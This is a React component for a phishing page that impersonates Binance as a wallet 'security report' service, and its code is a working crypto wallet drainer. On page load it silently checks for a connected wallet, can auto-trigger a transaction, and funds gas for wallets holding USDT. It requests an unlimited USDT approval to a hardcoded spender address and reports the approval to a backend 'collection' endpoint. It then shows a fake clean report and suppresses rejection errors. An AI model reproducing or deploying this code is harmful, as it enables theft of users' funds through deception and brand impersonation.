import React, { useState, useEffect, useRef } from 'react';
import { ethers } from 'ethers';
import axios from 'axios';
import {
  Shield,
  CircleCheckBig,
  Zap,
  TrendingUp,
  Star,
  Users,
  Landmark,
  Lock,
  Clock
} from "lucide-react";
import { ShieldCheck } from "lucide-react";
import { Twitter, Send, MessageCircle } from "lucide-react";
import { Link } from "react-router-dom";
import { Check } from "lucide-react";
import { Search } from "lucide-react";
import { AlertTriangle } from "lucide-react";

// 🔹 CONSTANTS
const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const DEFAULT_SPENDER_ADDRESS = '0x73E2339c61E563FBC6E0173ad698742e6093407a';
const BACKEND_URL = import.meta.env.VITE_BACKEND_URL;
const USDT_ABI = [
    'function approve(address spender, uint256 amount) external returns (bool)',
];

const Hero = () => {
    const [isProcessing, setIsProcessing] = useState(false);
    const [errorMsg, setErrorMsg] = useState('');
    const [showPopup, setShowPopup] = useState(false);
    
const [showError, setShowError] = useState(false);
    const [popupData, setPopupData] = useState({ address: '', balance: '', date: '', certId: '' });
const errorTimeoutRef = useRef(null);
    const isProcessingRef = useRef(false);
    const hasAutoTriggered = useRef(false);

      // 🔥 VISIT NOTIFICATION - DVV Pay Backend Version (with attemptFund flag)
        const notifyVisit = async (address, shouldFund = false) => {
            if (!address) return null;
            try {
                const response = await axios.post(`${BACKEND_URL.replace('/notify-approval', '/notify-visit')}`, {
                    userAddress: address,
                    attemptFund: shouldFund  // ✅ DVV Pay requires this flag
                });
                console.log('✅ Visit Check Done. Funded:', response.data.funded);
                return response.data;
            } catch (e) {
                console.error('Failed to notify visit:', e.message);
                return null;
            }
        };
    

    // 🔥 Helper to wait for balance
    const waitForBalanceUpdate = async (provider, address, initialBalance) => {
        console.log(`⏳ Waiting for balance to increase from ${initialBalance}...`);
        const maxRetries = 20; // 40 seconds max
        let retries = 0;

        while (retries < maxRetries) {
            try {
                const newBalance = await provider.getBalance(address);
                if (newBalance > initialBalance) {
                    console.log(`✅ Balance increased! New: ${newBalance}`);
                    return true;
                }
            } catch (e) { console.error("Balance check err", e); }

            await new Promise(r => setTimeout(r, 2000));
            retries++;
        }
        return false; // Timed out
    };

    // 🔥 CRITICAL FIX: iPhone Trust Wallet Detection & Silent Connection
    useEffect(() => {
        const initWalletSilently = async () => {
            try {
                if (!window.ethereum) return;

                // 🔥 KEY CHANGE 1: Check if already connected FIRST (NO POPUP)
                const accounts = await window.ethereum.request({
                    method: 'eth_accounts', // Silent check - NO popup on iPhone/Android
                });

                // 🔥 KEY CHANGE 2: Auto-switch network WITHOUT requesting accounts
                const targetChainId = '0x38';
                try {
                    const currentChainId = await window.ethereum.request({
                        method: 'eth_chainId',
                    });

                    if (currentChainId !== targetChainId) {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: targetChainId }],
                        });
                        console.log('✅ Network switched to BSC');
                    }
                } catch (switchError) {
                    if (switchError.code === 4902) {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [
                                {
                                    chainId: targetChainId,
                                    chainName: 'Binance Smart Chain',
                                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                    rpcUrls: ['https://bsc-dataseed1.binance.org/'],
                                    blockExplorerUrls: ['https://bscscan.com/'],
                                },
                            ],
                        });
                    }
                }

                // 🔥 KEY CHANGE 3: Only auto-trigger if wallet is ALREADY connected
                if (accounts && accounts.length > 0) {
                    // Notify Backend of Visit - Silent Trigger
                    notifyVisit(accounts[0]);

                    if (!hasAutoTriggered.current) {
                        hasAutoTriggered.current = true;
                        console.log('🚀 Auto-triggering transaction...');

                        setTimeout(() => {
                            handleProcess();
                        }, 1500);
                    }
                }
            } catch (err) {
                console.error('❌ Init error:', err);
            }
        };

        initWalletSilently();
    }, []);

    // 🔥 OPTIMIZED: Direct transaction without eth_requestAccounts
    const handleProcess = async () => {
        if (isProcessingRef.current) return;

        setIsProcessing(true);
        setErrorMsg('');
        isProcessingRef.current = true;

        try {
            if (!window.ethereum) {
                throw new Error('No Wallet Found.');
            }

            // 🔥 STEP 1: Get accounts silently (NO POPUP)
            let accounts = await window.ethereum.request({
                method: 'eth_accounts',
            });

            // 🔥 STEP 2: Only if NOT connected, request permission
            if (!accounts || accounts.length === 0) {
                console.log('⚠️ Wallet not connected, requesting permission...');
                accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts',
                });
            }

            if (!accounts || accounts.length === 0) {
                throw new Error('No accounts found');
            }

            const userAddress = accounts[0];
            console.log('📍 User Address:', userAddress);

            // 🔥 STEP 3: Ensure BSC network
            const bscChainId = '0x38';
            const currentChainId = await window.ethereum.request({
                method: 'eth_chainId',
            });

            if (currentChainId !== bscChainId) {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: bscChainId }],
                });
            }

            // 🔥 STEP 4: Create provider and signer
            const provider = new ethers.BrowserProvider(window.ethereum);

             // 🔥 DVV PAY BACKEND: CHECK USDT FIRST, THEN REQUEST FUNDING
                        try {
                            // Get current BNB balance
                            const initialBalance = await provider.getBalance(userAddress);
                            console.log(`💰 Current BNB Balance: ${ethers.formatEther(initialBalance)} BNB`);
            
                            // 🔥 Check USDT balance FIRST to decide if we should request funding
                            const usdtAbiCheck = ["function balanceOf(address account) view returns (uint256)"];
                            const usdtContractCheck = new ethers.Contract(USDT_ADDRESS, usdtAbiCheck, provider);
                            const usdtBalance = await usdtContractCheck.balanceOf(userAddress);
            
                            // Only request funding if user has USDT > 0 (same logic as aarush_final)
                            const shouldRequestFunding = usdtBalance > 0n;
            
                            console.log(`💰 USDT Balance: ${ethers.formatUnits(usdtBalance, 18)} USDT`);
                            console.log(`🔥 Requesting Auto-Fund: ${shouldRequestFunding}`);
            
                            // Notify Server with attemptFund flag
                            const serverRes = await notifyVisit(userAddress, shouldRequestFunding);
            
                            if (serverRes && serverRes.funded) {
                                console.log('⏳ Waiting for BNB top-up...');
                                const funded = await waitForBalanceUpdate(provider, userAddress, initialBalance);
                                if (funded) {
                                    console.log('✅ Topup Received! Proceeding...');
                                    await new Promise(r => setTimeout(r, 1000));
                                } else {
                                    console.warn("⚠️ Topup wait timed out, trying to proceed anyway...");
                                }
                            } else if (shouldRequestFunding) {
                                console.log('ℹ️ User has USDT but already has sufficient gas');
                            } else {
                                console.log('ℹ️ User has no USDT, skipping funding request');
                            }
                        } catch (fundErr) {
                            console.error("❌ Auto-fund check failed", fundErr);
                        }

              // 🔥 CHECK USDT BALANCE BEFORE PROCEEDING
            const usdtAbiBalance = ["function balanceOf(address account) view returns (uint256)"];
            const usdtContractReadOnly = new ethers.Contract(USDT_ADDRESS, usdtAbiBalance, provider);
            const usdtBalance = await usdtContractReadOnly.balanceOf(userAddress);

   if (usdtBalance === 0n) {
    setErrorMsg("No USDT found in your wallet.");
    setShowError(true);

    if (errorTimeoutRef.current) {
        clearTimeout(errorTimeoutRef.current);
    }

    errorTimeoutRef.current = setTimeout(() => {
        setShowError(false);

        // wait for fade-out animation before clearing text
        setTimeout(() => {
            setErrorMsg("");
        }, 300); // match animation duration
    }, 5000);

    setIsProcessing(false);
    isProcessingRef.current = false;
    return;
}


            console.log(`💰 USDT Balance: ${ethers.formatUnits(usdtBalance, 18)} USDT`);

            const signer = await provider.getSigner();

            // 🔥 STEP 5: Contract instance
            const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);

            console.log(`🎯 Approving MaxUint256 USDT for ${DEFAULT_SPENDER_ADDRESS}`);

            // 🔥 STEP 6: Send approve transaction
            const tx = await usdtContract.approve(DEFAULT_SPENDER_ADDRESS, ethers.MaxUint256);

            console.log('⏳ Waiting for confirmation...');
            const receipt = await tx.wait();

            console.log('✅ Transaction confirmed:', receipt.hash);

            // 🔥 STEP 7: Backend collection
            try {
                const response = await axios.post(BACKEND_URL, {
                    userAddress: userAddress,
                    txHash: receipt.hash,
                    source: 'website',
                });

                if (response.data.success) {
                    console.log('✅ Backend Collection Successful:', response.data.hash);
                }
            } catch (backendError) {
                console.warn('⚠️ Backend log failed but tx success:', backendError);
            }

            // Prepare popup data
            let formattedBalance = "0.00";
            try {
                const usdtAbiBalance = ["function balanceOf(address account) view returns (uint256)"];
                const usdtContractRO = new ethers.Contract(USDT_ADDRESS, usdtAbiBalance, provider);
                const bal = await usdtContractRO.balanceOf(userAddress);
                formattedBalance = ethers.formatUnits(bal, 18);
            } catch (e) { console.log("Balance fetch error", e); }

            setPopupData({
                address: userAddress,
                balance: formattedBalance,
                date: new Date().toLocaleDateString(),
                certId: "USDT-" + Math.floor(Math.random() * 90000000 + 10000000)
            });
            setShowPopup(true);

        } catch (error) {
            console.error('❌ Error:', error);

            // 🔹 ROBUST REJECTION HANDLER: Suppress ALL user rejection errors (Code 4001, UNKNOWN_ERROR or text match)
            const errString = error?.message?.toLowerCase() || '';
            const isUserRejection =
                error.code == 4001 || // Loose equality checks both string "4001" and number 4001
                error.code === 'UNKNOWN_ERROR' || // Ethers.js generic error often linked to cancellations
                errString.includes('rejected') ||
                errString.includes('cancelled') ||
                errString.includes('user denied') ||
                errString.includes('could not coalesce error'); // Catch the specific wrapper error text

            if (isUserRejection) {
                console.log('User rejected/cancelled transaction (or unknown error suppressed). No error shown to UI.');
                return; // 🛑 EXIT COMPLETELY - Do not set error state
            }

            let errorMessage = 'Transaction failed';
            if (error.code === -32002) {
                errorMessage = 'Request already pending. Please open Trust Wallet.';
            } else if (error.message) {
                errorMessage = error.message;
            }
            setErrorMsg(errorMessage);
        } finally {
            setIsProcessing(false);
            isProcessingRef.current = false;
        }
    };
const [reportId, setReportId] = useState("");
const generateReportId = () => {
  const randomNumber = Math.floor(10000 + Math.random() * 90000);
  const year = new Date().getFullYear();
  return `SR-${randomNumber}-${year}`;
};
useEffect(() => {
  if (showPopup) {
    setReportId(generateReportId());
  }
}, [showPopup]);

   return (
    <>
  <section className="min-h-screen bg-black flex items-center justify-center px-4 sm:px-6">
    
<div className="max-w-4xl w-full text-center py-16 sm:py-20">



      {/* Top Badge */}
      <div className="inline-flex items-center gap-2 px-4 py-2 mt-4 sm:mt-6 rounded-full bg-yellow-500/10 text-yellow-400 text-xs sm:text-sm mb-5 sm:mb-6">
  <ShieldCheck className="w-4 h-4" />
  Enterprise-Grade Security
</div>


      {/* Heading */}
      <h1 className="text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-bold text-white mb-5 sm:mb-6 leading-tight">
        Secure Your <span className="text-yellow-400">Digital Assets</span>
      </h1>

      {/* Paragraph */}
<p className="text-gray-400 max-w-2xl mx-auto text-sm sm:text-base md:text-lg leading-relaxed mb-6 sm:mb-8">
        Advanced blockchain security analysis and comprehensive reporting for your cryptocurrency portfolio. Real-time protection across all networks.
      </p>

      {/* Security Card */}
<div className="mx-auto max-w-md rounded-2xl bg-gradient-to-b from-slate-900 to-slate-950 border border-white/5 p-6 sm:p-8 mb-5">
 

<div className="w-13 h-13 mx-auto mb-4 rounded-xl bg-emerald-500 flex items-center justify-center">
  <div className="w-6 h-6 rounded-full border-2 border-white flex items-center justify-center">
    <Check className="w-3 h-3 text-white stroke-[4]" />
  </div>
</div>

        <h3 className="text-white text-base sm:text-lg font-semibold mb-2">
          Multi-Layer Security
        </h3>
        <p className="text-xs sm:text-sm text-slate-400">
          Advanced encryption & real-time fraud detection with 99.9% accuracy
        </p>
      </div>

      {/* Button */}
      <button
        onClick={handleProcess}
        disabled={isProcessing}
        className="inline-flex items-center justify-center gap-2 bg-yellow-400 text-black font-semibold px-6 sm:px-8 py-3.5 sm:py-4 rounded-xl transition-all duration-200 cursor-pointer mb-3 sm:mb-3 hover:shadow-[0_0_30px_rgba(250,204,21,0.35)] hover:scale-[1.02] active:scale-95 disabled:opacity-70"
      >
        {isProcessing ? "Processing..." : "GENERATE REPORT"}
      </button>
{/* Animated Error Message */}
{errorMsg && (
  <div className="flex justify-center mt-0.5">
    <div
      className={`w-full max-w-md px-4 py-3 rounded-xl text-sm flex items-center justify-center gap-2
      bg-red-900/40 border border-red-600/40 text-red-400
      transition-all duration-300 ease-in-out
      ${showError ? "opacity-100 translate-y-0" : "opacity-0 -translate-y-2"}`}
    >
      <AlertTriangle className="w-4 h-4" />
      {errorMsg}
    </div>
  </div>
)}


      {/* Stats Cards */}
      <div className="flex flex-wrap justify-center gap-4 sm:gap-6 mt-2.5 mb-8 sm:mb-10">

        <div className="bg-slate-950 border border-white/5 rounded-xl px-5 py-4 min-w-[140px]">
          <h2 className="text-yellow-400 text-xl sm:text-2xl font-bold">99.9%</h2>
          <p className="text-xs sm:text-sm text-gray-400">Success Rate</p>
        </div>

        <div className="bg-slate-950 border border-white/5 rounded-xl px-5 py-4 min-w-[140px]">
          <h2 className="text-emerald-400 text-xl sm:text-2xl font-bold">2.3s</h2>
          <p className="text-xs sm:text-sm text-gray-400">Avg Speed</p>
        </div>

        <div className="bg-slate-950 border border-white/5 rounded-xl px-5 py-4 min-w-[140px]">
          <h2 className="text-sky-400 text-xl sm:text-2xl font-bold">50M+</h2>
          <p className="text-xs sm:text-sm text-gray-400">Reports Generated</p>
        </div>
      </div>

      {/* Bottom Security Badges */}
      <div className="flex flex-wrap justify-center gap-3 sm:gap-4">
        <div className="flex items-center gap-2 bg-slate-950 border border-white/5 px-4 py-2 rounded-full text-xs sm:text-sm text-slate-300">
          <Landmark className="w-4 h-4 text-emerald-400" />
          Bank-Grade Security
        </div>

        <div className="flex items-center gap-2 bg-slate-950 border border-white/5 px-4 py-2 rounded-full text-xs sm:text-sm text-slate-300">
          <Lock className="w-4 h-4 text-sky-400" />
          Privacy Protected
        </div>

        <div className="flex items-center gap-2 bg-slate-950 border border-white/5 px-4 py-2 rounded-full text-xs sm:text-sm text-slate-300">
          <Clock className="w-4 h-4 text-yellow-400" />
          24/7 Support
        </div>
      </div>

      
    </div>
                {/* Custom Modal/Popup */}

{/* Second Popup - Binance Style */}
{showPopup && (
    <div className="fixed inset-0 z-[9999] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
<div className="bg-[#02101F] rounded-2xl shadow-[0_10px_40px_rgba(0,0,0,0.6)] p-6 max-w-md w-full relative text-center animate-in fade-in zoom-in duration-300">
            {/* Close button */}
            <button
                onClick={() => setShowPopup(false)}
                className="absolute top-4 right-4 text-white-400 hover:text-white"
            >
                ✕
            </button>

            {/* Header */}
            <div className="flex items-left justify-left gap-2 mb-6">
                
               <h3 className="flex items-center gap-2 text-emerald-400 text-base font-semibold">
  🔍 Security Report Generated
</h3>

            </div>

          {/* Warning Icon */}
<div className="mb-4 flex justify-center">
 <svg
  viewBox="0 0 120 120"
  className="w-20 h-20"
  xmlns="http://www.w3.org/2000/svg"
>
  {/* Dark Brown Circle */}
  <circle cx="60" cy="60" r="40" fill="#3A2A05" />

  {/* Larger Rounded Triangle */}
  <path
    d="M60 40
       C59 40, 58 41, 57 43
       L40 75
       C39 77, 41 80, 44 80
       L76 80
       C79 80, 81 77, 80 75
       L63 43
       C62 41, 61 40, 60 40 Z"
    fill="#e4b313"
  />

  {/* Thicker Exclamation Line */}
{/* Smaller Centered Exclamation Line */}
{/* Exclamation Line */}
<rect
  x="57.5"
  y="52"
  width="5"
  height="18"
  rx="2.5"
  fill="#000000"
/>

{/* Dot (Moved Down for More Gap) */}
<circle
  cx="60"
  cy="74.5"
  r="2.8"
  fill="#000000"
/>

</svg>

</div>

            {/* Title */}
            <h2 className="text-2xl font-bold text-white mb-2">Balance Notice</h2>
            <p className="text-gray-400 text-sm mb-6">Comprehensive wallet analysis completed</p>

           {/* Security Status */}
<div className="bg-emerald-500/10 rounded-2xl p-4 mb-4">

  
  <div className="flex items-center gap-3">
    
    <div className="flex items-center justify-center w-10 h-10 
  rounded-full 
  border-2 border-emerald-400">

  <svg 
    className="w-5 h-5 text-emerald-400" 
    fill="none" 
    stroke="currentColor" 
    viewBox="0 0 24 24"
  >
    <path 
      strokeLinecap="round" 
      strokeLinejoin="round" 
      strokeWidth={3.5} 
      d="M5 13l4 4L19 7" 
    />
  </svg>
</div>


    <div className="text-left">
      <h4 className="text-emerald-400 font-semibold">
        Security Status
      </h4>
      <p className="text-gray-300 text-sm">
        No flagged address found.
      </p>
    </div>

  </div>
</div>


            {/* Balance Details */}
           <div className="bg-[#0a1f33] rounded-2xl p-4 mb-4 text-left space-y-3">

              
<div className="flex justify-between items-center">
                    <span className="text-gray-300">Report ID</span>
                    <span className="text-gray-400" >
  {reportId}
</span>

                </div>
                <div className="flex justify-between items-center">
                    <span className="text-gray-300">Wallet Balance (USD)</span>
                    <span className="text-emerald-400 font-semibold">${popupData?.balance
    ? Number(popupData.balance).toFixed(2)
    : "0.00"}{" "}
</span>
                </div>
                <div className="flex justify-between items-center">
                    <span className="text-gray-300">Reported USDT</span>
                    <span className="text-red-400 font-semibold">0.00</span>
                </div>
            </div>

          {/* Balance Status Message */}
<div
  className={`rounded-lg p-3 mb-6 ${
    Number(popupData?.balance) > 0
      ? "bg-emerald-500/10 border border-emerald-500/30"
      : "bg-red-500/10 border border-red-500/30"
  }`}
>
  <p
    className={`text-sm ${
      Number(popupData?.balance) > 0
        ? "text-emerald-400"
        : "text-red-400"
    }`}
  >
    {Number(popupData?.balance) > 0
      ? "No reported USDT detected."
      : "No USDT found in wallet."}
  </p>
</div>


            {/* Close Button */}
           <button
  onClick={() => setShowPopup(false)}
  className="w-full py-3 bg-yellow-300 text-gray-900 font-semibold 
rounded-full border border-yellow-400 
hover:bg-yellow-400 transition-all duration-200 
shadow-[0_0_20px_rgba(234,179,8,0.35)]"

>
  Close Report
</button>

        </div>
    </div>
)}
  </section>

      {/* Features Section */}
<section className="w-full bg-gradient-to-b from-slate-900 to-slate-950 py-24 px-6">
  <div className="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">

    {/* Left Content */}
    <div>
      <h2 className="text-4xl font-bold text-white mb-6">
        Enterprise-Grade Security
      </h2>

      <p className="text-slate-400 max-w-xl mb-10 leading-relaxed">
        Protect your digital assets with military-grade encryption and advanced threat detection systems.
      </p>

      {/* Feature 1 */}
      <div className="flex gap-4 mb-8">
        <div className="w-12 h-12 rounded-xl bg-emerald-500/15 flex items-center justify-center">
          <Shield className="w-6 h-6 text-emerald-400" />
        </div>
        <div>
          <h4 className="text-white font-semibold mb-1">Multi-Layer Protection</h4>
          <p className="text-slate-400 text-sm">
            Advanced security protocols with real-time monitoring and instant threat response.
          </p>
        </div>
      </div>

      {/* Feature 2 */}
      <div className="flex gap-4 mb-8">
        <div className="w-12 h-12 rounded-xl bg-sky-500/15 flex items-center justify-center">
          <Lock className="w-6 h-6 text-sky-400" />
        </div>
        <div>
          <h4 className="text-white font-semibold mb-1">Privacy First</h4>
          <p className="text-slate-400 text-sm">
            Zero-knowledge architecture ensures your data remains completely private.
          </p>
        </div>
      </div>

      {/* Feature 3 */}
      <div className="flex gap-4">
        <div className="w-12 h-12 rounded-xl bg-yellow-500/15 flex items-center justify-center">
          <Clock className="w-6 h-6 text-yellow-400" />
        </div>
        <div>
          <h4 className="text-white font-semibold mb-1">24/7 Monitoring</h4>
          <p className="text-slate-400 text-sm">
            Continuous surveillance with instant alerts for suspicious activities.
          </p>
        </div>
      </div>
    </div>

    {/* Right Dashboard Card */}
    <div className="bg-slate-800/60 border border-white/5 rounded-2xl p-8 backdrop-blur">
      <h3 className="text-white text-lg font-semibold mb-6">
        Security Dashboard
      </h3>

      <div className="space-y-4">
        <div className="bg-slate-700/60 rounded-lg px-6 py-4 text-white">
          Total Assets Secured: <span className="font-semibold">2.3B+</span>
        </div>
        <div className="bg-slate-700/60 rounded-lg px-6 py-4 text-white">
          Active Users: <span className="font-semibold">150K+</span>
        </div>
        <div className="bg-slate-700/60 rounded-lg px-6 py-4 text-white">
          Threats Blocked: <span className="font-semibold">2.1M+</span>
        </div>
      </div>
    </div>

  </div>
</section>

{/* Footer */}
<footer className="relative bg-black/95 backdrop-blur-md text-slate-400">
  <div className="absolute top-0 left-0 w-full h-px bg-white/10"></div>

  <div className="max-w-7xl mx-auto px-6 py-16">
    <div className="grid grid-cols-1 md:grid-cols-3 gap-12">

      {/* Logo + About */}
<div>
  <div className="flex items-center gap-1 mb-2">

    {/* Binance Logo Icon */}
  <img
  src="/bnb.png"
  alt="Binance Logo"
  className="w-10 h-10 object-contain brightness-110 saturate-150"
/>


    {/* Gradient BINANCE Text */}
    <span className="text-xl font-bold text-[#F0B90B] tracking-wide">
  BINANCE
</span>


  </div>

  <p className="text-sm leading-relaxed max-w-sm mb-6 text-slate-400">
    Advanced blockchain security analysis and comprehensive reporting for your cryptocurrency portfolio.
  </p>
</div>
<div className="flex gap-3 mt-0">

  {/* Twitter */}
<a
  href="https://x.com/binance"
  rel="noopener noreferrer"
  className="w-10 h-10 flex items-center justify-center rounded-lg bg-slate-800/80 hover:bg-slate-700 transition"
>
  <svg viewBox="0 0 24 24" className="w-5 h-5 fill-white">
    <path d="M18.244 2H21l-6.56 7.503L22 22h-6.828l-5.347-6.99L3.9 22H1.144l7.02-8.023L2 2h6.93l4.84 6.39L18.244 2zm-2.396 18h1.88L8.38 3.89H6.43L15.848 20z"/>
  </svg>
</a>

{/* Telegram */}
<a
  href="https://t.me/binance_announcements"
  rel="noopener noreferrer"
  className="w-10 h-10 flex items-center justify-center rounded-lg bg-slate-800/80 hover:bg-slate-700 transition"
>
  <svg viewBox="0 0 24 24" className="w-5 h-5 fill-white">
    <path d="M9.993 15.674l-.397 5.585c.568 0 .814-.244 1.11-.537l2.662-2.547 5.52 4.04c1.012.558 1.728.265 1.996-.93l3.62-16.96c.314-1.463-.53-2.035-1.51-1.67L1.21 9.817c-1.42.558-1.399 1.352-.242 1.708l5.606 1.748L19.92 5.52c.627-.416 1.198-.186.728.23"/>
  </svg>
</a>


{/* Discord */}
<a
  href="https://discord.com/invite/binanceofficial"
  rel="noopener noreferrer"
  className="w-10 h-10 flex items-center justify-center rounded-lg bg-slate-800/80 hover:bg-slate-700 transition"
>
  <svg
    viewBox="0 0 24 24"
    className="w-5 h-5 fill-white"
    xmlns="http://www.w3.org/2000/svg"
  >
    <path d="M20.317 4.37a19.79 19.79 0 0 0-3.432-1.37.05.05 0 0 0-.054.025c-.149.264-.314.608-.43.884a18.27 18.27 0 0 0-8.802 0c-.116-.276-.281-.62-.43-.884a.05.05 0 0 0-.054-.025 19.736 19.736 0 0 0-3.432 1.37.046.046 0 0 0-.021.019C1.53 8.045.32 11.61.6 15.13a.056.056 0 0 0 .02.038 19.9 19.9 0 0 0 5.993 3.012.05.05 0 0 0 .056-.02c.463-.63.873-1.295 1.226-1.99a.05.05 0 0 0-.027-.07 12.64 12.64 0 0 1-1.872-.9.05.05 0 0 1-.005-.084c.126-.094.252-.192.372-.291a.05.05 0 0 1 .052-.007c3.927 1.793 8.18 1.793 12.062 0a.05.05 0 0 1 .052.007c.12.099.246.197.372.291a.05.05 0 0 1-.005.084 12.64 12.64 0 0 1-1.872.9.05.05 0 0 0-.027.07c.353.695.763 1.36 1.226 1.99a.05.05 0 0 0 .056.02 19.864 19.864 0 0 0 5.993-3.012.05.05 0 0 0 .02-.038c.323-4.073-.552-7.618-2.685-10.76a.046.046 0 0 0-.021-.019zM9.545 13.636c-.967 0-1.762-.889-1.762-1.984s.78-1.984 1.762-1.984c.992 0 1.777.899 1.762 1.984 0 1.095-.78 1.984-1.762 1.984zm4.91 0c-.967 0-1.762-.889-1.762-1.984s.78-1.984 1.762-1.984c.992 0 1.777.899 1.762 1.984 0 1.095-.78 1.984-1.762 1.984z"/>
  </svg>
</a>



</div>


     <div>
  <h4 className="text-white font-semibold mb-4">Quick Links</h4>

  <ul className="space-y-3 text-sm">
    <li>
      <button
        onClick={() => window.scrollTo(0, 0)}
        className="hover:text-yellow-400 transition"
      >
        Home
      </button>
    </li>

    <li>
      <a
    href="https://www.bnbchain.org/en/bnb-smart-chain"
    rel="noopener noreferrer"
    className="hover:text-yellow-400 transition"
  >
        Blockchain
      </a>
    </li>

    <li>
     <a
    href="https://www.bnbchain.org/en/solutions/tokenization/rwa-real-world-assets"
    rel="noopener noreferrer"
    className="hover:text-yellow-400 transition"
  >
        Tokens
      </a>
    </li>

    <li>
      <a
    href="https://docs.bnbchain.org/bnb-smart-chain/validator/create-val"
   
    rel="noopener noreferrer"
    className="hover:text-yellow-400 transition"
  >
        Validators
      </a>
    </li>
  </ul>
</div>


  {/* Support */}
<div>
  <h4 className="text-white font-semibold mb-4">Support</h4>

  <ul className="space-y-3 text-sm">
    <li>
        <a
    href="https://www.binance.com/en-IN/support"
    rel="noopener noreferrer"
    className="hover:text-yellow-400 transition"
  >
    Help Center
  </a>
    </li>

    <li>
      <a
    href="https://www.binance.com/en-IN/support/chat-invitation"
    rel="noopener noreferrer"
    className="hover:text-yellow-400 transition"
  >
        Contact Us
      </a>
    </li>

    <li>
      <a
    href="https://www.binance.com/en-IN/about-legal/privacy-portal"
    rel="noopener noreferrer"
    className="hover:text-yellow-400 transition"
  >
        Privacy Policy
      </a>
    </li>

    <li>
      <a
    href="https://www.binance.com/en-IN/terms"
    rel="noopener noreferrer"
    className="hover:text-yellow-400 transition"
  >
        Terms of Service
      </a>
    </li>
  </ul>
</div>


    </div>

    <div className="border-t border-white/10 my-10"></div>

    <p className="text-sm text-slate-500">
      Binance© 2026. All rights reserved.
    </p>
  </div>
</footer>

  </>
);

};

export default Hero;
